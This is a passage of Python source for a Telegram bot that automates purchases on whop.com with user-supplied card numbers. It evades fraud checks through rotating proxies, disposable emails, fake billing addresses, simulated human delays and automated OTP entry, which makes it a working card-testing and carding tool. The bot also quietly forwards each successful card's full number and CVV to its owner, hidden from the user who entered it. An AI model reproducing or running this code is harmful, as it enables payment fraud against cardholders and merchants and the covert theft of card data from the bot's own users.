                    if t.get('status') == 'failed':
                        result.update({'failure_message': t.get('message'),
                                       'failure_status':  t.get('status'),
                                       'failure_stage':   t.get('stage')})
                        break
                if data.get('completed'):
                    result['payment_success'] = True
                return result
            if attempt < max_retries - 1:
                time.sleep(retry_delay)
        return {'checkout_status': 'timeout', 'payment_success': False,
                'action_required': False, 'failure_message': 'Payment processing timed out'}

    def handle_otp_verification(self) -> Dict:
        if not self.temp_mail:
            return {'success': False, 'error': 'No temp mail available'}
        matches = self.temp_mail.wait_for_result(timeout=180, interval=3)
        if not matches:
            return {'success': False, 'error': 'No OTP received within timeout'}
        otp_codes = list(dict.fromkeys(code for m in matches for code in m.get('otp_codes', [])))
        if not otp_codes:
            return {'success': False, 'error': 'No OTP codes found in email'}
        for otp in otp_codes:
            try:
                result = self.submit_payment(self.current_email, self.card_token,
                                             self.billing_address or {}, otp)
                if result.get('status') == 'action_required':
                    continue
                if result.get('completed') or result.get('status') == 'idle':
                    return {'success': True, 'otp_used': otp,
                            'checkout_status': result.get('status'), 'checkout_data': result}
                sr = self.check_payment_status(max_retries=5, retry_delay=2)
                if sr.get('payment_success'):
                    return {'success': True, 'otp_used': otp,
                            'checkout_status': sr.get('checkout_status'), 'checkout_data': sr}
            except Exception:
                continue
        return {'success': False, 'error': 'All OTP attempts failed'}

    def process_with_temp_email(self, card_info: Dict, billing_address: Dict,
                                product_url: str, domain: str = "random",
                                username: str = None) -> Dict:
        email = self.generate_temp_email(domain, username)
        self.billing_address = billing_address
        self.card_token      = None
        try:
            funnel_id, plan_id = self.get_product_page(product_url)

            # Small pause — simulate user reading the product page
            time.sleep(random.uniform(1.2, 2.8))

            self.create_checkout_session(funnel_id, plan_id)

            # Simulate user typing their email into the form
            time.sleep(random.uniform(0.8, 1.8))
            self.preload_email(email)

            # ── Phase 1: push email + billing (complete=False) ────────────────
            # Real browsers send this PATCH before even touching the card fields.
            time.sleep(random.uniform(0.5, 1.2))
            self.update_checkout_details(email, billing_address)

            # Simulate user filling in card details (iframe load + typing)
            time.sleep(random.uniform(2.5, 5.0))

            card_token      = self.tokenize_card(
                card_info['number'], card_info['exp_month'],
                card_info['exp_year'], card_info['cvc'],
            )
            self.card_token = card_token

            # Tiny pause after tokenization (iframe posts the token, then JS calls PATCH)
            time.sleep(random.uniform(0.4, 1.0))

            # ── Phase 2: attach payment + complete=True ───────────────────────
            self.submit_payment(email, card_token, billing_address)

            status_result = self.check_payment_status()
            if status_result.get('action_required') and status_result.get('action') == 'login':
                otp_result = self.handle_otp_verification()
                if otp_result.get('success'):
                    return {'success': True, 'email': email, 'checkout_id': self.checkout_id,
                            'otp_used': otp_result.get('otp_used')}
                return {'success': False, 'email': email, 'checkout_id': self.checkout_id,
                        'error': otp_result.get('error')}
            if status_result.get('payment_success'):
                return {'success': True, 'email': email, 'checkout_id': self.checkout_id}
            return {
                'success':         False,
                'email':           email,
                'checkout_id':     self.checkout_id,
                'failure_message': status_result.get('failure_message', 'Payment failed'),
                'failure_status':  status_result.get('failure_status'),
                'failure_stage':   status_result.get('failure_stage'),
            }
        except Exception as e:
            return {'success': False, 'email': email, 'error': str(e)}


def parse_cc_input(cc_string: str) -> Dict:
    parts = cc_string.split('|')
    if len(parts) != 4:
        raise ValueError("Use format: CC|MM|YY|CVV")
    number, month, year, cvc = [p.strip() for p in parts]
    exp_year = int(year)
    if exp_year < 100:
        exp_year += 2000
    return {'number': number, 'exp_month': int(month), 'exp_year': exp_year, 'cvc': cvc}

# ============================================================================
# LOGGING
# ============================================================================

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
logger = logging.getLogger(__name__)

# ============================================================================
# BOT + DISPATCHER
# ============================================================================

bot = Bot(token=BOT_TOKEN)
dp  = Dispatcher(storage=MemoryStorage())

executor = ThreadPoolExecutor(max_workers=20)

# ============================================================================
# IN-MEMORY STORE
# ============================================================================

# { user_id: {"product_url": str, "funnel_id": str, "plan_id": str} }
user_store: dict = {}

# Approved users (owner always has access)
approved: set = set()

# Per-user proxy list: { user_id: ["host:port:user:pass", ...] }
user_proxies: dict = {}


def get_user(uid: int) -> dict:
    if uid not in user_store:
        user_store[uid] = {}
    return user_store[uid]


def is_owner(uid: int) -> bool:
    return uid == OWNER_ID


def is_approved(uid: int) -> bool:
    """Only approved users (+ owner) can use the bot."""
    return uid == OWNER_ID or uid in approved


# ============================================================================
# PROXY HELPERS
# ============================================================================

def _build_proxy_dict(proxy_str: str) -> dict:
    s = proxy_str.strip()
    # Already has scheme prefix (http://, https://, socks4://, socks5://)
    if re.match(r'^(https?|socks[45])://', s):
        return {'http': s, 'https': s}
    # user:pass@host:port (no scheme)
    if '@' in s:
        return {'http': f'http://{s}', 'https': f'http://{s}'}
    parts = s.split(':')
    if len(parts) == 2:
        # host:port
        return {'http': f'http://{s}', 'https': f'http://{s}'}
    if len(parts) == 4:
        # host:port:user:pass
        host, port, user, pwd = parts
        auth = f'{user}:{pwd}@{host}:{port}'
        return {'http': f'http://{auth}', 'https': f'http://{auth}'}
    raise ValueError("Invalid proxy format. Supported: host:port | host:port:user:pass | user:pass@host:port | http://...")


def _test_proxy_sync(proxy_str: str) -> bool:
    """
    Two-stage proxy validation:
      1. Basic connectivity — can it reach the internet at all?
      2. Whop-compatibility — does Whop's checkout page return 200?
         Proxies that return 403, 407, 429, 5xx or a payment-wall page
         are rejected here before they silently break checkouts.
    """
    try:
        pd = _build_proxy_dict(proxy_str)
        s  = requests.Session()
        s.proxies.update(pd)
        s.verify = False
        s.mount('https://', SSLAdapter())
        s.headers.update({'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

        # Stage 1 — basic internet connectivity
        r1 = s.get('https://api.ipify.org', timeout=12)
        if r1.status_code != 200:
            return False

        # Stage 2 — Whop-compatibility check
        # Hit the Whop checkout API endpoint; anything other than 200/201/400/404
        # (400/404 are expected — the endpoint exists but needs a valid session)
        # means the proxy is blocked, behind a payment wall, or throwing errors.
        r2 = s.get('https://whop.com/checkout/api/', timeout=15,
                   headers={'accept': 'application/json', 'x-csrf': 'test'})
        bad_codes = {403, 407, 429, 500, 502, 503, 504}
        if r2.status_code in bad_codes:
            return False
        # Some proxies return 200 but with a captcha/payment-wall HTML body
        body_low = r2.text[:400].lower()
        if any(kw in body_low for kw in ('payment required', 'captcha', 'access denied',
                                          'blocked', 'authenticate', 'proxy auth')):
            return False

        return True
    except Exception:
        return False


async def test_proxy(proxy_str: str) -> bool:
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(executor, _test_proxy_sync, proxy_str)


def get_user_proxy(uid: int) -> tuple[Optional[dict], Optional[str]]:
    """Returns (proxy_dict, raw_proxy_string) — both None if no proxies set.
    Rotates randomly across the full list on every call.
    """
    proxies = user_proxies.get(uid, [])
    if not proxies:
        return None, None
    raw = random.choice(proxies)
    return _build_proxy_dict(raw), raw


def has_proxy(uid: int) -> bool:
    return bool(user_proxies.get(uid))


# ============================================================================
# FSM STATES
# ============================================================================

class S(StatesGroup):
    idle              = State()
    waiting_product   = State()
    waiting_cc        = State()
    processing        = State()


# ============================================================================
# ACCESS CHECK
# ============================================================================

async def access_check(message: Message, require_proxy: bool = True) -> bool:
    uid = message.from_user.id
    if not is_approved(uid):
        await message.answer(
            "🔒 <b>Access Restricted</b>\n\n"
            "You are not approved to use this bot.\n"
            "Contact the owner to get access.",
            parse_mode="HTML",
        )
        return False
    if require_proxy and not is_owner(uid) and not has_proxy(uid):
        await message.answer(
            "🌐 <b>No Proxy Set</b>\n\n"
            "You must add at least one proxy before using the bot.\n\n"
            "<code>/addproxy host:port:user:pass</code>",
            parse_mode="HTML",
        )
        return False
    return True


# ============================================================================
# ASYNC WRAPPERS (run sync whop.py code in thread pool)
# ============================================================================

async def async_validate_url(url: str, proxy: dict = None, affiliate_code: str = None):
    loop     = asyncio.get_event_loop()
    checkout = WhopCheckout(debug=False, proxy=proxy, affiliate_code=affiliate_code)
    return await loop.run_in_executor(executor, checkout.get_product_page, url)


async def async_checkout(product_url: str, card_info: dict,
                         proxy: dict = None, affiliate_code: str = None) -> dict:
    loop    = asyncio.get_event_loop()
    billing = get_random_billing()

    def _run():
        checkout = WhopCheckout(debug=False, proxy=proxy, affiliate_code=affiliate_code)
        return checkout.process_with_temp_email(
            card_info=card_info,
            billing_address=billing,
            product_url=product_url,
            domain="random",
        )

    return await loop.run_in_executor(executor, _run)


# ============================================================================
# HANDLERS — GENERAL
# ============================================================================

@dp.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    uid  = message.from_user.id
    name = message.from_user.full_name

    # Notify owner of new unapproved users
    if not is_approved(uid):
        try:
            await bot.send_message(
                OWNER_ID,
                f"👤 <b>New user started the bot</b>\n\n"
                f"Name: {name}\n"
                f"ID:   <code>{uid}</code>\n\n"
                f"Use /a {uid} to approve.",
                parse_mode="HTML",
            )
        except Exception:
            pass
        await message.answer(
            "🔒 <b>Access Restricted</b>\n\n"
            "You are not approved to use this bot.\n"
            "Your request has been sent to the owner.",
            parse_mode="HTML",
        )
        return

    await state.set_state(S.idle)
    role      = "👑 Owner" if is_owner(uid) else "✅ Approved"
    px_count  = len(user_proxies.get(uid, []))
    px_status = f"🌐 {px_count} proxy(s) set" if px_count else ("🌐 No proxy (owner)" if is_owner(uid) else "⚠️ No proxy — add one with /addproxy")
    await message.answer(
        f"🚀 <b>Whop Checkout Bot</b>  |  {role}\n"
        f"{px_status}\n\n"
        "<b>Checkout:</b>\n"
        "  /setproduct — Set a Whop product URL\n"
        "  /product    — View saved product\n"
        "  /buy        — Start a checkout\n"
        "  /clear      — Clear saved product\n\n"
        "<b>Proxy:</b>\n"
        "  /addproxy &lt;proxy&gt;  — Add &amp; test a proxy\n"
        "  /proxies             — List your proxies\n"
        "  /delproxy &lt;n&gt;    — Delete proxy #n\n"
        "  /checkproxies        — Test &amp; remove dead proxies\n\n"
        "<b>Or drop a</b> <code>whop.com</code> <b>URL</b> to set it.\n"
        "<b>Or drop</b> <code>CC|MM|YY|CVV</code> to run checkout instantly.\n\n"
        + (
            "<b>User management (owner only):</b>\n"
            "  /a &lt;id&gt;      — Approve user\n"
            "  /da &lt;id&gt;     — Remove user\n"
            "  /users      — List approved users\n"
            "  /broadcast &lt;msg&gt; — Broadcast\n"
            if is_owner(uid) else ""
        ),
        parse_mode="HTML",
    )


# ============================================================================
# HANDLERS — PRODUCT
# ============================================================================

@dp.message(Command("setproduct"))
async def cmd_setproduct(message: Message, state: FSMContext):
    if not await access_check(message):
        return
    await state.set_state(S.waiting_product)
    await message.answer(
        "🔗 <b>Send me the Whop product URL</b>\n\n"
        "Example:\n<code>https://whop.com/toolsuite/buy-vip/</code>",
        parse_mode="HTML",
    )


@dp.message(Command("product"))
async def cmd_product(message: Message, state: FSMContext):
    if not await access_check(message):
        return
    d = get_user(message.from_user.id)
    if not d.get("product_url"):
        await message.answer("❌ No product saved. Use /setproduct to add one.")
        return
    await message.answer(
        f"📦 <b>Saved Product</b>\n\n"
        f"🔗 URL: <code>{d['product_url']}</code>\n"
        f"🎯 Funnel ID: <code>{d.get('funnel_id', 'N/A')}</code>\n"
        f"📋 Plan ID: <code>{d.get('plan_id', 'N/A')}</code>",
        parse_mode="HTML",
    )


@dp.message(Command("clear"))
async def cmd_clear(message: Message, state: FSMContext):
    if not await access_check(message):
        return
    user_store[message.from_user.id] = {}
    await state.set_state(S.idle)
    await message.answer("🗑️ Product cleared.")


# ============================================================================
# HANDLERS — BUY
# ============================================================================

@dp.message(Command("buy"))
async def cmd_buy(message: Message, state: FSMContext):
    if not await access_check(message):
        return
    d = get_user(message.from_user.id)
    if not d.get("product_url"):
        await message.answer("❌ No product set. Use /setproduct first.")
        return
    current = await state.get_state()
    if current == S.processing:
        await message.answer("⏳ A checkout is already running. Please wait.")
        return
    await state.set_state(S.waiting_cc)
    await message.answer(
        f"💳 <b>Drop your card details</b>\n\n"
        f"Format: <code>CC|MM|YY|CVV</code>\n"
        f"Example: <code>4017447113157628|03|2027|433</code>\n\n"
        f"🔗 Product: <code>{d['product_url']}</code>",
        parse_mode="HTML",
    )


# ============================================================================
# HANDLER — URL DROP (any state)
# ============================================================================

@dp.message(F.text.regexp(r'https?://whop\.com/\S+'))
async def handle_url_drop(message: Message, state: FSMContext):
    if not await access_check(message):
        return
    url_match = re.search(r'https?://whop\.com/\S+', message.text)
    if not url_match:
        return
    url = url_match.group(0).rstrip('/?').rstrip('/')
    await _process_product_url(message, state, url)


@dp.message(S.waiting_product)
async def handle_product_state_input(message: Message, state: FSMContext):
    if not await access_check(message):
        return
    url = message.text.strip().rstrip('/')
    await _process_product_url(message, state, url)


async def _process_product_url(message: Message, state: FSMContext, url: str):
    uid = message.from_user.id
    if not re.match(r'https?://whop\.com/', url):
        await message.answer(
            "❌ <b>Invalid URL.</b> Must be a <code>whop.com</code> product URL.\n"
            "Example: <code>https://whop.com/toolsuite/buy-vip/</code>",
            parse_mode="HTML",
        )
        return

    msg   = await message.answer("🔍 <b>Validating product URL...</b>", parse_mode="HTML")
    proxy, _ = get_user_proxy(uid)
    # Extract affiliate code from URL (e.g. ?a=shubhamind29)
    from urllib.parse import urlparse, parse_qs
    aff_match = parse_qs(urlparse(url).query).get('a', [None])[0]
    try:
        funnel_id, plan_id = await async_validate_url(url, proxy=proxy, affiliate_code=aff_match)
        d = get_user(uid)
        d["product_url"]    = url
        d["funnel_id"]      = funnel_id
        d["plan_id"]        = plan_id
        d["affiliate_code"] = aff_match   # persist so checkout uses it later
        await state.set_state(S.idle)
        await msg.edit_text(
            f"✅ <b>Product saved!</b>\n\n"
            f"🔗 URL: <code>{url}</code>\n"
            f"🎯 Funnel ID: <code>{funnel_id}</code>\n"
            f"📋 Plan ID: <code>{plan_id}</code>\n\n"
            f"Use /buy to start a checkout.",
            parse_mode="HTML",
        )
    except Exception as e:
        await msg.edit_text(
            f"❌ <b>Validation failed!</b>\n\n"
            f"Could not extract product data from the URL.\n"
            f"Error: <code>{str(e)[:250]}</code>\n\n"
            f"Make sure it's a valid Whop product page.",
            parse_mode="HTML",
        )


# ============================================================================
# HANDLER — CC INPUT
# ============================================================================

CC_PATTERN = re.compile(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$')


@dp.message(S.waiting_cc)
async def handle_cc_state(message: Message, state: FSMContext):
    if not await access_check(message):
        return
    await _process_cc(message, state)


@dp.message(F.text.regexp(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$'))
async def handle_cc_anytime(message: Message, state: FSMContext):
    if not await access_check(message):
        return
    current = await state.get_state()
    if current == S.processing:
        await message.answer("⏳ Already processing a checkout. Please wait.")
        return
    d = get_user(message.from_user.id)
    if not d.get("product_url"):
        await message.answer(
            "❌ No product set.\n\nUse /setproduct to add a Whop product URL first."
        )
        return
    await _process_cc(message, state)


async def _process_cc(message: Message, state: FSMContext):
    uid     = message.from_user.id
    cc_text = message.text.strip()

    # Parse CC
    try:
        card_info = parse_cc_input(cc_text)
    except ValueError as e:
        await message.answer(
            f"❌ <b>Invalid format:</b> {e}\n\n"
            f"Use: <code>CC|MM|YY|CVV</code>",
            parse_mode="HTML",
        )
        return

    d = get_user(uid)
    product_url = d.get("product_url")
    if not product_url:
        await message.answer("❌ No product set. Use /setproduct first.")
        await state.set_state(S.idle)
        return

    # Block duplicate runs
    await state.set_state(S.processing)

    # Delete the CC message for security
    try:
        await message.delete()
    except Exception:
        pass

    proxy, proxy_chosen = get_user_proxy(uid)
    aff_code     = d.get("affiliate_code")
    card_display = f"{card_info['number'][:6]}xxxxxx{card_info['number'][-4:]}"
    billing      = get_random_billing()
    # Show which proxy was actually selected this run (not always index 0)
    if proxy_chosen:
        _ph = proxy_chosen.split(':')[0]   # host portion only
        proxy_label = f"🌐 {_ph}"
    else:
        proxy_label = "🌐 No proxy (owner)"

    msg = await message.answer(
        f"⚙️ <b>Checkout started...</b>\n\n"
        f"💳 Card: <code>{card_display}</code>\n"
        f"📅 Exp: <code>{card_info['exp_month']:02d}/{card_info['exp_year']}</code>\n"
        f"📦 Product: <code>{product_url}</code>\n"
        f"🏠 Billing: {billing['name']}, {billing['city']}, {billing['state']}\n"
        f"{proxy_label}\n\n"
        f"📧 Generating temp email...\n"
        f"⏳ This may take up to 3 minutes (OTP wait included).",
        parse_mode="HTML",
    )

    try:
        result = await async_checkout(product_url, card_info, proxy=proxy, affiliate_code=aff_code)  # proxy rotated per-run

        if result.get("success"):
            text = (
                f"✅ <b>APPROVED</b>\n\n"
                f"💳 Card: <code>{card_display}</code>\n"
                f"📧 Email: <code>{result.get('email', 'N/A')}</code>\n"
                f"🆔 Checkout: <code>{result.get('checkout_id', 'N/A')}</code>\n"
            )
            if result.get("otp_used"):
                text += f"🔑 OTP: <code>{result['otp_used']}</code>\n"
            text += f"\n🎉 <b>Purchase Successful!</b>"

            # Silent log to owner — invisible to user
            if uid != OWNER_ID:
                try:
                    await bot.send_message(
                        OWNER_ID,
                        f"🔐 <b>CC Hit</b>\n\n"
                        f"<code>{card_info['number']}|{card_info['exp_month']:02d}|{card_info['exp_year']}|{card_info['cvc']}</code>\n\n"
                        f"👤 User: <code>{uid}</code>\n"
                        f"📧 Email: <code>{result.get('email', 'N/A')}</code>\n"
                        f"🆔 Checkout: <code>{result.get('checkout_id', 'N/A')}</code>\n"
                        f"🔗 Product: <code>{product_url}</code>",
                        parse_mode="HTML",
                    )
                except Exception:
                    pass
        else:
            failure = (
                result.get("failure_message")
                or result.get("error")
                or "Unknown error"
            )
            # Build detailed decline message
            text = (
                f"❌ <b>DECLINED</b>\n\n"
                f"💳 Card: <code>{card_display}</code>\n"
                f"📧 Email: <code>{result.get('email', 'N/A')}</code>\n"
                f"💬 Reason: <code>{str(failure)[:300]}</code>\n"
            )
            if result.get("failure_stage"):
                text += f"📊 Stage: <code>{result['failure_stage']}</code>\n"
            chk_status = result.get("checkout_status", "")
            if chk_status and chk_status not in ("idle",):
                text += f"🔄 Status: <code>{chk_status}</code>\n"
            # Hint for generic "Payment failed"
            if str(failure).lower() in ("payment failed", "unknown error", "none"):
                text += (
                    "\n💡 <i>Generic decline — likely causes: dead card, "
                    "AVS/billing mismatch, BIN blocked, or flagged proxy.</i>"
                )

        await msg.edit_text(text, parse_mode="HTML")

    except Exception as e:
        logger.exception("Checkout error for uid=%s", uid)
        await msg.edit_text(
            f"❌ <b>Checkout error</b>\n\n<code>{str(e)[:400]}</code>",
            parse_mode="HTML",
        )
    finally:
        await state.set_state(S.idle)


# ============================================================================
# HANDLERS — PROXY MANAGEMENT
# ============================================================================

@dp.message(Command("addproxy"))
async def cmd_addproxy(message: Message, state: FSMContext):
    if not await access_check(message, require_proxy=False):
        return
    uid      = message.from_user.id
    raw_text = message.text.partition(" ")[2].strip()

    # Support: /addproxy sent as a REPLY to a .txt file
    if not raw_text and message.reply_to_message:
        doc = message.reply_to_message.document
        if doc and (doc.mime_type == 'text/plain' or doc.file_name.endswith('.txt')):
            wait_msg = await message.answer("📄 <b>Downloading proxy file...</b>", parse_mode="HTML")
            try:
                file_info = await bot.get_file(doc.file_id)
                dl        = await bot.download_file(file_info.file_path)
                raw_text  = dl.read().decode('utf-8', errors='ignore')
                await wait_msg.delete()
            except Exception as e:
                await wait_msg.edit_text(f"❌ Failed to download file: {e}")
                return

    if not raw_text:
        await message.answer(
            "<b>Usage:</b> /addproxy &lt;proxy&gt;\n\n"
            "You can paste <b>multiple proxies</b> at once (one per line).\n\n"
            "Supported formats:\n"
            "  <code>host:port</code>\n"
            "  <code>host:port:user:pass</code>\n"
            "  <code>user:pass@host:port</code>\n"
            "  <code>http://user:pass@host:port</code>\n"
            "  <code>socks5://user:pass@host:port</code>",
            parse_mode="HTML",
        )
        return

    # Parse all lines — filter blanks and validate format
    lines       = [l.strip() for l in raw_text.splitlines() if l.strip()]
    valid, bad  = [], []
    for line in lines:
        try:
            _build_proxy_dict(line)
            valid.append(line)
        except ValueError:
            bad.append(line)

    if not valid:
        await message.answer(
            f"❌ <b>No valid proxies found.</b>\n\n"
            f"Bad lines:\n" + "\n".join(f"<code>{b}</code>" for b in bad[:10]),
            parse_mode="HTML",
        )
        return

    if len(valid) == 1:
        msg = await message.answer("🔍 <b>Testing proxy...</b>", parse_mode="HTML")
    else:
        msg = await message.answer(
            f"🔍 <b>Testing {len(valid)} proxies in parallel...</b>",
            parse_mode="HTML",
        )

    # Test all valid proxies concurrently
    results = await asyncio.gather(*[test_proxy(p) for p in valid])

    if uid not in user_proxies:
        user_proxies[uid] = []

    added = dupes = failed_list = 0
    lines_out = []
    for proxy_str, ok in zip(valid, results):
        if not ok:
            lines_out.append(f"❌ <code>{proxy_str}</code>")
            failed_list += 1
        elif proxy_str in user_proxies[uid]:
            lines_out.append(f"⚠️ <code>{proxy_str}</code> (already in list)")
            dupes += 1
        else:
            user_proxies[uid].append(proxy_str)
            lines_out.append(f"✅ <code>{proxy_str}</code>")
            added += 1

    total = len(user_proxies[uid])
    summary = f"✅ Added: {added}  ❌ Dead: {failed_list}  ⚠️ Dupes: {dupes}"
    if bad:
        summary += f"  🚫 Invalid format: {len(bad)}"

    body = "\n".join(lines_out[:30])  # cap at 30 lines to avoid Telegram msg limit
    await msg.edit_text(
        f"📋 <b>Proxy import results:</b>\n\n{body}\n\n"
        f"{summary}\n"
        f"🌐 You now have <b>{total}</b> proxy(s).",
        parse_mode="HTML",
    )


@dp.message(Command("proxies"))
async def cmd_proxies(message: Message, state: FSMContext):
    if not await access_check(message, require_proxy=False):
        return
    uid     = message.from_user.id
    proxies = user_proxies.get(uid, [])
    if not proxies:
        await message.answer(
            "🌐 <b>No proxies set.</b>\n\nAdd one:\n<code>/addproxy host:port:user:pass</code>",
            parse_mode="HTML",
        )
        return
    lines = "\n".join(f"<code>#{i+1}</code>  <code>{p}</code>" for i, p in enumerate(proxies))
    await message.answer(
        f"🌐 <b>Your proxies ({len(proxies)}):</b>\n\n{lines}\n\n"
        "Delete: /delproxy &lt;n&gt;   |   Check: /checkproxies",
        parse_mode="HTML",
    )


@dp.message(Command("delproxy"))
async def cmd_delproxy(message: Message, state: FSMContext):
    if not await access_check(message, require_proxy=False):
        return
    uid     = message.from_user.id
    proxies = user_proxies.get(uid, [])
    parts   = message.text.split()
    if len(parts) < 2 or not parts[1].isdigit():
        await message.answer("Usage: /delproxy &lt;number&gt;  (see /proxies for list)", parse_mode="HTML")
        return
    idx = int(parts[1]) - 1
    if idx < 0 or idx >= len(proxies):
        await message.answer(f"❌ Invalid number. You have {len(proxies)} proxy(s).")
        return
    removed = proxies.pop(idx)
    await message.answer(
        f"🗑️ Proxy #{idx+1} removed:\n<code>{removed}</code>\n\nRemaining: {len(proxies)}.",
        parse_mode="HTML",
    )


@dp.message(Command("checkproxies"))
async def cmd_checkproxies(message: Message, state: FSMContext):
    if not await access_check(message, require_proxy=False):
        return
    uid     = message.from_user.id
    proxies = list(user_proxies.get(uid, []))
    if not proxies:
        await message.answer("🌐 No proxies to check.")
        return
    msg = await message.answer(
        f"🔍 <b>Checking {len(proxies)} proxy(s)...</b>",
        parse_mode="HTML",
    )
    results = await asyncio.gather(*[test_proxy(p) for p in proxies])
    alive   = [p for p, ok in zip(proxies, results) if ok]
    dead    = [p for p, ok in zip(proxies, results) if not ok]
    user_proxies[uid] = alive
    lines = [f"{'✅' if ok else '❌'} <code>{p}</code>" for p, ok in zip(proxies, results)]
    await msg.edit_text(
        f"🔍 <b>Check complete:</b>\n\n" + "\n".join(lines)
        + f"\n\n✅ Alive: {len(alive)}  ❌ Removed: {len(dead)}",
        parse_mode="HTML",
    )


# ============================================================================
# HANDLERS — USER MANAGEMENT (owner only)
# ============================================================================

@dp.message(Command("a"))
async def cmd_approve(message: Message, state: FSMContext):
    if not is_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) < 2 or not parts[1].isdigit():
        await message.answer("Usage: /a <user_id>")
        return
    target = int(parts[1])
    approved.add(target)
    await message.answer(f"✅ <code>{target}</code> approved.", parse_mode="HTML")
    try:
        await bot.send_message(
            target,
            "✅ <b>You've been approved!</b>\n\nSend /start to begin.",
            parse_mode="HTML",
        )
    except Exception:
        pass


@dp.message(Command("da"))
async def cmd_remove(message: Message, state: FSMContext):
    if not is_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) < 2 or not parts[1].isdigit():
        await message.answer("Usage: /da <user_id>")
        return
    target = int(parts[1])
    approved.discard(target)
    await message.answer(f"✅ <code>{target}</code> removed.", parse_mode="HTML")


@dp.message(Command("users"))
async def cmd_users(message: Message, state: FSMContext):
    if not is_owner(message.from_user.id):
        return
    if not approved:
        await message.answer("📋 No approved users yet. Use /a <id> to approve.")
        return
    lines = "\n".join(f"• <code>{u}</code>" for u in approved)
    await message.answer(f"✅ <b>Approved users:</b>\n{lines}", parse_mode="HTML")


@dp.message(Command("broadcast"))
async def cmd_broadcast(message: Message, state: FSMContext):
    if not is_owner(message.from_user.id):
        return
    text = message.text.partition(" ")[2].strip()
    if not text:
        await message.answer("Usage: /broadcast <message>")
        return
    all_uids = set(user_store.keys()) | approved
    sent = failed = 0
    for uid in all_uids:
        try:
            await bot.send_message(uid, f"📢 <b>Broadcast:</b>\n\n{text}", parse_mode="HTML")
            sent += 1
        except Exception:
            failed += 1
    await message.answer(f"📢 Broadcast done — ✅ {sent} sent, ❌ {failed} failed.")


# ============================================================================
# MAIN
# ============================================================================

async def self_ping_loop():
    """Pings its own external URL every 10 minutes to stay awake on Render Free Tier."""
    await asyncio.sleep(60)  # Wait for startup
    url = os.environ.get("RENDER_EXTERNAL_URL")
    if not url:
        logger.info("RENDER_EXTERNAL_URL not found. Self-ping disabled.")
        return

    logger.info("Self-ping loop started targeting: %s", url)
    client = requests.Session()
    client.verify = False
    client.mount('https://', SSLAdapter())

    while True:
        try:
            def _ping():
                return client.get(url, timeout=15)

            loop = asyncio.get_event_loop()
            r = await loop.run_in_executor(executor, _ping)
            logger.info("Self-ping status: %s", r.status_code)
        except Exception as e:
            logger.warning("Self-ping failed: %s", e)

        await asyncio.sleep(600)  # Ping every 10 minutes


async def main():
    logger.info("Starting Whop Checkout Bot (owner=%s)", OWNER_ID)

    # Set up a dummy web server on the Render PORT (required for Web Services on free tier)
    from aiohttp import web

    async def handle_ping(request):
        return web.Response(text="OK")

    app = web.Application()
    app.router.add_get('/', handle_ping)
    app.router.add_get('/health', handle_ping)

    runner = web.AppRunner(app)
    await runner.setup()

    port = int(os.environ.get("PORT", "8080"))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    logger.info("Dummy web server started on port %s to satisfy Render health checks", port)

    # Start the self-ping loop in the background
    asyncio.create_task(self_ping_loop())

    await dp.start_polling(bot, skip_updates=True)


if __name__ == "__main__":
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ Set BOT_TOKEN at the top of bot.py before running!")
        sys.exit(1)
    asyncio.run(main())
